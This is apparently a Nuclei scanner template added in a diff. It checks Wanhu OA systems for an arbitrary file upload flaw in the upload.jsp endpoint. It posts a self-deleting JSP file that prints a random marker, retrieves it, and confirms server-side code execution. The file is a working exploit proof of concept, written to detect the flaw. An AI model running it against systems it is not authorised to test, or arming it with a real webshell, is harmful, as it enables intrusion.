@@ -1,0 +1,59 @@
+id: wanhu-fileupload-common-upload
+info:
+  name: wanhu-fileupload-common-upload
+  author: wanhu-fileupload-common-upload
+  severity: critical
+variables:
+  a1: "{{to_lower(rand_base(5))}}"
+  a2: "{{to_lower(rand_base(20))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/platform/portal/layout/common/upload.jsp?portletSettingId=123&path=dir HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+        Connection: close
+        Cookie: OASESSIONID=416B4CE965CD27DEED8197A8528A33E6
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+
+        ------{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{a1}}.jsp"
+        Content-Type: application/octet-stream
+
+        <%out.println("{{a2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------{{boundary}}--
+      - |
+        GET /defaultroot/upload/dir/{{date}}/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+        Connection: close
+        Cookie: OASESSIONID=416B4CE965CD27DEED8197A8528A33E6
+        Accept-Encoding: gzip, deflate
+
+    extractors:
+      - type: regex
+        name: filename
+        part: body
+        internal: true
+        regex:
+          - '(\d+\.jsp)'
+        group: 1
+
+      - type: regex
+        name: date
+        part: body
+        internal: true
+        regex:
+          - '(\d{6})\d+\.jsp'
+        group: 1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains((body_1), '.jsp')"
+          - "status_code_2 == 200 && contains((body_2), '{{a2}}')"
+        condition: and
+
